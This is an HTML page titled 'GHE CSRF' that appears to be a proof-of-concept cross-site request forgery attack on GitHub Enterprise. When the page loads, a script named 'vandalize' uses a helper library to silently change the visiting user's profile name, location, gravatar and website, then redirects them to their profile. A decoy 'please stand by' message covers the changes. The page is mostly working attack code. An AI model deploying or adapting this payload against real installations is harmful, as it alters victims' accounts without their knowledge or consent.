<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8">
        <meta name="description" content="">
        <meta name="viewport" content="width=device-width">
        <title>GHE CSRF</title>
        <style>
          .msg {
            width: 600px;
            margin: 0 auto;
            text-align: center;
            margin-top: 150px;
            font-family: Helvetica, Arial, sans-serif;
          }
          .loading img {
            width: 30px;
            height: 30px;
          }
        </style>
    </head>
    <body>

        <div class="msg">
          <p><blink>Doing some stuffs... Please stand by.</blink></p>
        </div>

        <script src="../dist/ghe.js"></script>
        <script>

          var vandalize = Promise.all([
              GHE.user.setName('Brian Carroll'),
              GHE.user.setLocation('San Francisco'),
              GHE.user.setGravatar('b@mailinator.net'),
              GHE.user.setWebsite('http://bucketheadland.com')
          ]);

          vandalize.then(function() {
            GHE.user.goToProfile();
          });

          vandalize.catch(function( err ) {
            console.error( err );
            document.getElementsByClassName('msg')[0].innerText = "This isn't a GitHub Enterprise installation! Nothing's gonna happen!";
          });

        </script>
    </body>
</html>